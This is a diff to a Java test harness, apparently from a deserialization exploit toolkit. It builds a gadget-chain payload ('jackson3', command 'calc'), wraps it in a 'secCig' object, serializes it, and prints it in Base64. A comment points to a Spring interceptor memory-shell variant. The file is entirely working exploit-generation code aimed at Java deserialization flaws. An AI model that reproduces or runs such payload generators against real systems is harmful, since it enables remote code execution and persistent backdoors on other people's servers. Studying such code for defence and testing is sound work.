@@ -8,20 +8,20 @@ import java.util.Base64;
 
 public class Test {
     public static void main(String[] args) throws Exception {
-        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("jackson4");
-        ObjectPayload                        payload      = payloadClass.newInstance();
-        Object                               object       = payload.getObject("dir"); //EX-MS-SpringInterceptorMS-gz
+        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("jackson3");
+        ObjectPayload payload = payloadClass.newInstance();
+        Object object = payload.getObject("calc"); //EX-MS-SpringInterceptorMS-gz
 
         secCig rootObj = new secCig();
         rootObj.setMessage("qi4l");
         rootObj.setSecObject(object);
 
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream    oos  = new ObjectOutputStream(baos);
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
         oos.writeObject(rootObj);
         oos.close();
 
-        byte[] payloadBytes  = baos.toByteArray();
+        byte[] payloadBytes = baos.toByteArray();
         String base64Payload = Base64.getEncoder().encodeToString(payloadBytes);
         System.out.println(base64Payload);
     }
